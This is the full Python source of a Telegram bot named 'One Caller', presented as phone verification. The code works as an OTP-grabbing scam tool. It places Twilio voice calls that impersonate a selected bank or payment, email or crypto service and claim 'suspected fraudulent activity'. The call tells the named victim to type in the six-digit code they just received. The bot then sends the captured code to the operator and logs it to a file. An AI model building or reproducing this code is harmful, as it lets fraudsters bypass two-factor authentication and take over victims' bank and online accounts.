import os
import threading
import logging
import signal
import sys
import time
from flask import Flask, jsonify, request
import telebot
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse
import phonenumbers
from dotenv import load_dotenv
import redis
from urllib.parse import urlparse

# Load environment variables
load_dotenv()

# Configure logging with UTF-8 encoding
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_BOT_TOKEN:
    logging.error("TELEGRAM_BOT_TOKEN not found in environment variables!")
    sys.exit(1)

# Twilio credentials
ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
TWILIO_FUNCTION_URL = os.getenv("TWILIO_FUNCTION_URL")

# Redis configuration
REDIS_URL = os.getenv("REDIS_URL")
REDIS_SOCKET_TIMEOUT = 5

# Initialize Flask and Telegram Bot
web_app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# User state storage with call tracking
user_states = {}
active_calls = {}

# Bank and Service options (your existing lists)
BANK_OPTIONS = [
    "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
    "Morgan Stanley", "KeyBank", "Bank of America Financial", "U.S. Bank Branch", "Truist",
    "BMO Harris Bank", "Fifth Third Bank", "Huntington Bank", "Ally Bank", "Wells Fargo Bank",
    "PNC Bank", "Capital One Bank", "First Citizens Bank", "M&T Bank", "American Express", "Paypal", "Coinbase"
]

SERVICE_OPTIONS = [
    ("💰 Cash App", "cashapp"),
    ("💸 Venmo", "venmo"),
    ("🍎 Apple Pay", "applepay"),
    ("📱 Google Pay", "googlepay"),
    ("📧 Gmail", "gmail"),
    ("✉️ Yahoo Mail", "yahoomail"),
    ("📫 Outlook Mail", "outlookmail")
]

BANKS_PER_PAGE = 8
SERVICES_PER_PAGE = 7


def create_inline_keyboard():
    """Create inline keyboard for main menu."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("📞 Start Call", callback_data="start_verification"),
        telebot.types.InlineKeyboardButton("ℹ️ Help", callback_data="help"),
        telebot.types.InlineKeyboardButton("❌ Cancel", callback_data="cancel"),
        telebot.types.InlineKeyboardButton("📊 Status", callback_data="status")
    )
    return markup

def create_bank_keyboard(page=0):
    """Create inline keyboard for bank selection with pagination."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    start_index = page * BANKS_PER_PAGE
    end_index = start_index + BANKS_PER_PAGE
    
    banks_page = BANK_OPTIONS[start_index:end_index]

    for bank in banks_page:
         markup.add(telebot.types.InlineKeyboardButton(bank, callback_data=f"bank_{bank}"))
    
    nav_buttons = []
    if page > 0:
      nav_buttons.append(telebot.types.InlineKeyboardButton("⬅️ Back", callback_data=f"banks_page_{page-1}"))
    if end_index < len(BANK_OPTIONS):
      nav_buttons.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"banks_page_{page+1}"))
    
    if nav_buttons:
        markup.row(*nav_buttons)
    
    return markup

def create_service_keyboard():
    """Create inline keyboard for service selection with pagination."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    for text, service in SERVICE_OPTIONS:
        markup.add(telebot.types.InlineKeyboardButton(text, callback_data=f"service_{service}"))
    return markup

def create_cancel_call_keyboard(call_sid):
    """Create inline keyboard to cancel an active call."""
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("⏹️ End Call", callback_data=f"cancel_call_{call_sid}"))
    return markup

def create_verification_type_keyboard():
    """Create inline keyboard to choose between bank or service verification."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("🏦 Verify Bank", callback_data="verify_bank"),
        telebot.types.InlineKeyboardButton("🌐 Verify Service", callback_data="verify_service")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle /start command."""
    welcome_text = (
        "🎯 Welcome to *One Caller*!\n\n"
        "I can help you verify phone numbers through voice calls.\n\n"
        "🏦 This service is designed to enhance account security by delivering OTP codes via a secure voice call\n\n"
        "📱 Features:\n"
        "• Secure voice call verification\n"
        "• Real-time call status updates\n"
        "• Automatic OTP collection\n\n"
        "Select an option to begin:"
    )
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode="Markdown",
        reply_markup=create_inline_keyboard()
    )

def update_call_status(chat_id, status_msg, call_sid=None):
    """Update user about call status and store in active_calls."""
    if call_sid:
        active_calls[chat_id] = {
            'call_sid': call_sid,
            'status': status_msg,
            'timestamp': time.time()
        }

    status_icons = {
        'ringing': '🔔',
        'in-progress': '📞',
        'completed': '✅',
        'failed': '❌',
        'busy': '⏰',
        'no-answer': '📵'
    }

    icon = next((icon for status, icon in status_icons.items() if status in status_msg.lower()), '🔄')
    bot.send_message(chat_id, f"{icon} {status_msg}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    """Handle inline keyboard callbacks with enhanced status reporting."""
    chat_id = call.message.chat.id
    
    if call.data == "start_verification":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "👤 Enter the name of the call recipient:"
        )
        user_states[chat_id] = "awaiting_recipient_name"
    
    elif call.data == "help":
        bot.answer_callback_query(call.id)
        help_text = (
            "📌 *One Caller Guide*\n\n"
            "1️⃣ Click 'Start Call'\n"
            "2️⃣ Enter recipient's name\n"
            "3️⃣ Choose to verify a bank or service\n"
            "4️⃣ Select the specific bank or service\n"
            "5️⃣ Enter phone number with country code\n"
            "6️⃣ Wait for the voice call\n"
            "7️⃣ Enter the code when prompted\n\n"
            "📞 *Call Status Icons:*\n"
            "🔔 Ringing\n"
            "📞 In Progress\n"
            "✅ Completed\n"
            "❌ Failed\n"
            "⏰ Busy\n"
            "📵 No Answer\n\n"
            "Need help? Contact @YourSupportHandle"
        )
        bot.send_message(chat_id, help_text, parse_mode="Markdown")
    
    elif call.data == "status":
        bot.answer_callback_query(call.id)
        if chat_id in active_calls:
            call_info = active_calls[chat_id]
            status_text = (
                "📊 *Current Call Status*\n\n"
                f"Call ID: `{call_info['call_sid']}`\n"
                f"Status: {call_info['status']}\n"
                f"Started: {time.strftime('%H:%M:%S', time.localtime(call_info['timestamp']))}"
            )
            bot.send_message(chat_id, status_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "No active calls found.")
            
    elif call.data.startswith("cancel_call_"):
        call_sid = call.data.split("_")[2]
        bot.answer_callback_query(call.id, text="Cancelling call...")
        handle_cancel_call(chat_id, call_sid)
        
    elif call.data == "cancel":
        bot.answer_callback_query(call.id)
        if chat_id in user_states:
            del user_states[chat_id]
        if chat_id in active_calls:
            del active_calls[chat_id]
        bot.send_message(
            chat_id,
            "❌ Operation cancelled. Send /start to begin again."
        )
    
    elif call.data == "verify_bank":
       bot.answer_callback_query(call.id)
       if isinstance(user_states.get(chat_id),dict):
         user_states[chat_id]["state"] = "awaiting_bank"
       else:
           user_states[chat_id] = {"state":"awaiting_bank"}
       bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())
    
    elif call.data == "verify_service":
        bot.answer_callback_query(call.id)
        if isinstance(user_states.get(chat_id),dict):
            user_states[chat_id]["state"] = "awaiting_service"
        else:
             user_states[chat_id] = {"state":"awaiting_service"}
        bot.send_message(chat_id, "🌐 Select a service:", reply_markup=create_service_keyboard())

    elif call.data.startswith("bank_"):
       bank_name = call.data[5:]
       bot.answer_callback_query(call.id, text=f"Selected: {bank_name}")
       if isinstance(user_states.get(chat_id),dict):
        user_states[chat_id]["state"] = "awaiting_phone"
        user_states[chat_id]["bank"] = bank_name
       else:
           user_states[chat_id] = {"state":"awaiting_phone", "bank":bank_name}
       bot.send_message(
           chat_id,
            "📱 Enter the phone number to verify:\n"
            "Format: +[country_code][number]\n"
            "Example: +15017122661"
       )
    elif call.data.startswith("service_"):
        service_name = call.data[8:]
        bot.answer_callback_query(call.id, text=f"Selected: {service_name}")
        if isinstance(user_states.get(chat_id),dict):
            user_states[chat_id]["state"] = "awaiting_phone"
            user_states[chat_id]["service"] = service_name
        else:
             user_states[chat_id] = {"state":"awaiting_phone", "service":service_name}
        bot.send_message(
           chat_id,
            "📱 Enter the phone number to verify:\n"
            "Format: +[country_code][number]\n"
            "Example: +15017122661"
        )
        
    elif call.data.startswith("banks_page_"):
        page = int(call.data.split("_")[2])
        bot.answer_callback_query(call.id)
        bot.edit_message_reply_markup(
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=create_bank_keyboard(page)
        )


@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    """Handle all text messages with enhanced status updates."""
    chat_id = message.chat.id
    
    if chat_id not in user_states:
        bot.send_message(
            chat_id,
            "⚠️ Please use /start to begin verification.",
            reply_markup=create_inline_keyboard()
        )
        return

    if user_states[chat_id] == "awaiting_recipient_name":
        user_states[chat_id] = {"state":"awaiting_verification_type", "recipient_name":message.text.strip()}
        bot.send_message(chat_id, "Choose the type of verification:", reply_markup=create_verification_type_keyboard())
        
    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_bank":
        bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())
    
    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_service":
        bot.send_message(chat_id, "🌐 Select a service:", reply_markup=create_service_keyboard())
    
    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_phone":
       if user_states[chat_id].get("bank"):
         handle_phone_number(message,user_states[chat_id].get("recipient_name"),user_states[chat_id].get("bank"),None)
       elif user_states[chat_id].get("service"):
         handle_phone_number(message,user_states[chat_id].get("recipient_name"),None,user_states[chat_id].get("service"))


def handle_phone_number(message,recipient_name,bank_name,service_name):
    """Handle phone number input with detailed status updates."""
    chat_id = message.chat.id
    phone_number = message.text.strip()
    
    if not validate_phone_number(phone_number):
        bot.send_message(
            chat_id,
            "❌ Invalid phone number format.\n"
            "Please use international format: +[country_code][number]"
        )
        return

    # Initial status message that we'll update
    status_message = bot.send_message(
        chat_id,
        "🔄 Initiating verification call...\n"
        "Please wait for status updates."
    )

    # Create Redis client
    redis_client = create_redis_client()
    if redis_client is None:
        bot.edit_message_text(
            "❌ Redis connection failed. Please try again.",
            chat_id=chat_id,
            message_id=status_message.message_id
        )
        return

    try:
        # Generate TwiML
        response = VoiceResponse()
        if bank_name:
            response.say(
                f"Hello {recipient_name}. This is an automated verification call from {bank_name} to prevent a suspected fraudulent activity on your account. "
                "Please listen carefully. You will need to enter the 6-digit verification code you received. "
                "Press the digits slowly and clearly.",
                voice="Polly.Joanna",
                language="en-US"
            )
        elif service_name:
            response.say(
                f"Hello {recipient_name}. This is an automated call from {service_name} for verification purposes. "
                 "Please listen carefully. You will need to enter the 6-digit verification code you received. "
                 "Press the digits slowly and clearly.",
                 voice="Polly.Joanna",
                 language="en-US"
             )
        gather = response.gather(
            num_digits=6,
            timeout=15,
            action=TWILIO_FUNCTION_URL,
            method="POST"
        )
        gather.say(
            "Please enter your verification code now.",
            voice="Polly.Joanna",
            language="en-US"
        )

        # Initiate the call
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        call = client.calls.create(
            to=phone_number,
            from_=TWILIO_PHONE_NUMBER,
            twiml=str(response)
        )
       # Update message with call SID
        if bank_name:
           bot.edit_message_text(
               f"📞 Call initiated for {recipient_name} from {bank_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
               chat_id=chat_id,
               message_id=status_message.message_id,
               parse_mode="Markdown",
               reply_markup=create_cancel_call_keyboard(call.sid)
           )
        elif service_name:
            bot.edit_message_text(
               f"📞 Call initiated for {recipient_name} from {service_name}\nID: `{call.sid}`\nStatus: *Initiating...*",
               chat_id=chat_id,
               message_id=status_message.message_id,
               parse_mode="Markdown",
               reply_markup=create_cancel_call_keyboard(call.sid)
           )

        # Monitor call status
        max_wait_time = 120  # 2 minutes
        start_time = time.time()
        call_status = call.status
        last_status = None

        status_emojis = {
            'queued': '⏳',
            'ringing': '🔔',
            'in-progress': '📞',
            'completed': '✅',
            'busy': '⏰',
            'failed': '❌',
            'no-answer': '📵',
            'canceled': '🚫'
        }

        while call_status not in ['completed', 'busy', 'failed', 'no-answer', 'canceled']:
            if time.time() - start_time > max_wait_time:
                bot.edit_message_text(
                    "⏱ Call verification timed out. Please try again.",
                    chat_id=chat_id,
                    message_id=status_message.message_id
                )
                return
            try:
                call = client.calls(call.sid).fetch()
                call_status = call.status
                
                # Update message only if status changed
                if call_status != last_status:
                    emoji = status_emojis.get(call_status, '🔄')
                    status_text = (
                        f"📱 *Call Status Update*\n\n"
                        f"ID: `{call.sid}`\n"
                        f"Status: {emoji} *{call_status.title()}*\n"
                        f"Phone: `{phone_number}`\n"
                        f"Time: {time.strftime('%H:%M:%S')}"
                    )
                    bot.edit_message_text(
                        status_text,
                        chat_id=chat_id,
                        message_id=status_message.message_id,
                        parse_mode="Markdown",
                         reply_markup=create_cancel_call_keyboard(call.sid)
                    )
                    last_status = call_status
            except Exception as e:
                logging.error(f"Error fetching call status: {e}")
                continue
            
            time.sleep(2)

        # Handle final call status
        if call_status == 'completed':
            # Wait briefly for OTP to be stored in Redis
            time.sleep(2)

            # Try to retrieve OTP
            otp_key = f"otp:{call.sid}"
            try:
                otp_code = redis_client.get(otp_key)
                if otp_code:
                  if bank_name:
                     success_message = (
                        f"✅ *Verification Successful!*\n\n"
                         f"👤 Recipient: `{recipient_name}`\n"
                        f"🏦 Bank: `{bank_name}`\n"
                        f"📱 Number: `{phone_number}`\n"
                        f"🔑 Code: `{otp_code}`\n"
                        f"🕒 Time: {time.strftime('%H:%M:%S')}"
                     )
                  elif service_name:
                      success_message = (
                          f"✅ *Verification Successful!*\n\n"
                         f"👤 Recipient: `{recipient_name}`\n"
                        f"🌐 Service: `{service_name}`\n"
                        f"📱 Number: `{phone_number}`\n"
                        f"🔑 Code: `{otp_code}`\n"
                        f"🕒 Time: {time.strftime('%H:%M:%S')}"
                     )
                   
                  bot.edit_message_text(
                        success_message,
                        chat_id=chat_id,
                        message_id=status_message.message_id,
                        parse_mode="Markdown"
                    )
                  redis_client.delete(otp_key)
                    
                    # Save verification to file
                  try:
                        with open("verified.txt", "a", encoding='utf-8') as f:
                            if bank_name:
                              f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Bank:{bank_name}, Phone: {phone_number}, Code: {otp_code}\n")
                            elif service_name:
                                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] User ID: {chat_id}, Name:{recipient_name}, Service:{service_name}, Phone: {phone_number}, Code: {otp_code}\n")
                  except IOError as e:
                         logging.error(f"Error saving verification: {e}")
                else:
                    bot.edit_message_text(
                        "⚠️ Call completed but no code was entered.\nPlease try again.",
                        chat_id=chat_id,
                        message_id=status_message.message_id
                    )
            except redis.exceptions.RedisError as e:
                bot.edit_message_text(
                    f"❌ Error retrieving verification code: {str(e)}",
                    chat_id=chat_id,
                    message_id=status_message.message_id
                )
        else:
            bot.edit_message_text(
                f"❌ Call failed: {call_status}\nPlease try again.",
                chat_id=chat_id,
                message_id=status_message.message_id
            )
        
    except Exception as e:
        bot.edit_message_text(
            f"❌ Error during verification: {str(e)}",
            chat_id=chat_id,
            message_id=status_message.message_id
        )
    finally:
        if redis_client:
            redis_client.close()
            
def handle_cancel_call(chat_id, call_sid):
    """Handles cancellation of an ongoing call."""
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        call = client.calls(call_sid).fetch()
        if call.status not in ['completed', 'canceled','failed']:
            call.update(status='canceled')
            bot.send_message(chat_id, f"🚫 Call with ID `{call_sid}` has been cancelled.")
        else:
              bot.send_message(chat_id, f"⚠️ Call with ID `{call_sid}` is already {call.status}.")
            
        if chat_id in active_calls and active_calls[chat_id].get('call_sid') == call_sid:
            del active_calls[chat_id]
        if chat_id in user_states:
            del user_states[chat_id]
    except Exception as e:
         bot.send_message(chat_id, f"❌ Error cancelling call `{call_sid}`: {str(e)}")

def validate_phone_number(phone_number):
    """Validates the format of a phone number.

    Args:
        phone_number (str): The phone number to validate.

    Returns:
        bool: True if the phone number is valid, False otherwise.
    """
    try:
        parsed_number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(parsed_number):
            logging.error(f"Invalid phone number format: {phone_number}")
            return False

        logging.info(f"Phone number {phone_number} is valid")
        return True
    except phonenumbers.phonenumberutil.NumberParseException:
        logging.error(f"Error parsing phone number: {phone_number}")
        return False

def create_redis_client():
    """Create and return a Redis client with robust error handling."""
    try:
        if not REDIS_URL:
            logging.error("REDIS_URL environment variable is not set.")
            return None

        parsed_url = urlparse(REDIS_URL)
        if parsed_url.scheme != 'rediss':
            logging.error("REDIS_URL scheme must be 'rediss://' for Upstash Redis.")
            return None

        redis_client = redis.Redis.from_url(
            REDIS_URL,
            decode_responses=True,
            socket_timeout=REDIS_SOCKET_TIMEOUT,
            socket_connect_timeout=REDIS_SOCKET_TIMEOUT,
            retry_on_timeout=True,
            max_connections=20,
            ssl_cert_reqs=None
        )
        redis_client.ping()
        logging.info("Redis connection established successfully")
        return redis_client

    except Exception as e:
        logging.error(f"Redis connection error: {e}")
        return None


# Flask route for health check
@web_app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "One Caller Bot is active",
         "bot_info":  "Bot information not retrieved on this route"
    }), 200

# Add webhook endpoint
@web_app.route('/' + TELEGRAM_BOT_TOKEN, methods=['POST'])
def telegram_webhook():
    """Handle incoming Telegram updates."""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return 'Error: Not a JSON request', 403



def signal_handler(signum, frame):
    """Handle shutdown gracefully."""
    logging.info("Shutting down bot...")
    print("\n👋 Bot shutdown requested. Cleaning up...")
    try:
        bot.remove_webhook()  # Remove the webhook on shutdown
    except:
        pass
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def main():
    """Main function to run the bot with enhanced error handling."""
    logging.info("Initializing One Caller Bot...")

    # Set webhook
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/{TELEGRAM_BOT_TOKEN}"
    bot.remove_webhook() # Clean up any existing webhook
    bot.set_webhook(url=webhook_url)
    logging.info(f"Telegram webhook set to: {webhook_url}")

    # Run Flask - this is now the entrypoint
    port = int(os.environ.get('PORT', 5000))
    web_app.run(host='0.0.0.0', port=port)  # Run in the main thread

if __name__ == '__main__':
    main()
